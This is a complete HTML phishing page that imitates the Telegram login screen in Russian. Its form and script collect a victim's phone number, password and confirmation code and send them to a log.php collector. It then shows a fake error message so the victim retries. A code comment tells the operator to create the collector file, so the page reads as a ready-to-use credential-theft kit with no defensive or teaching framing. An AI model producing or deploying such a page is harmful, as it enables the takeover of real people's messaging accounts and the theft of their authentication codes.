<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0f0f0f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }
        .container {
            width: 380px;
            background: #1f1f1f;
            border-radius: 12px;
            padding: 30px 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #229ED9, #1DA1F2);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            box-shadow: 0 4px 15px rgba(34, 158, 217, 0.5);
        }
        h1 {
            font-size: 24px;
            margin: 10px 0;
        }
        p {
            color: #aaa;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            background: #2a2a2a;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            background: #333;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #229ED9;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✈️</div>
        <h1>Вход в Telegram</h1>
        <p>Введите данные для входа в аккаунт</p>
        
        <form action="log.php" method="POST">
            <input type="text" name="phone" placeholder="Номер телефона" required autocomplete="off">
            <input type="password" name="password" placeholder="Пароль" required autocomplete="off">
            <input type="text" name="code" placeholder="Код подтверждения (если есть)" autocomplete="off">
            
            <button type="submit">Войти</button>
        </form>
        
        <div class="footer">
            <p>Проблемы со входом? <a href="#" style="color:#229ED9; text-decoration:none;">Получить помощь</a></p>
            <p style="margin-top:15px; font-size:12px;">© Telegram 2026</p>
        </div>
    </div>

    <script>
        // Fake form submission
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phone = document.querySelector('input[name="phone"]').value;
            const password = document.querySelector('input[name="password"]').value;
            const code = document.querySelector('input[name="code"]').value;
            
            // Send data to log.php (you need to create this file)
            fetch('log.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `phone=${encodeURIComponent(phone)}&password=${encodeURIComponent(password)}&code=${encodeURIComponent(code)}`
            }).then(() => {
                alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
            });
        });
    </script>
</body>
</html>
